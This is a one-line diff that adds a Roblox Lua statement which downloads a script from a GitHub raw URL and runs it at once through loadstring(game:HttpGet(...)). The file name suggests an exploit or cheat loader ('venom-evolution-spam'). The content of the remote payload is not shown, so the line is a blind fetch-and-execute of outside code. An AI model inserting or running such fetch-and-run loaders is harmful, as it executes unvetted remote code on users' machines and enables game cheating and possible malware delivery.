@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ForestBaseDuel/loaders/main/loaders/1-venom-evolution-spam3-49eumbeyol06vt.lua"))()
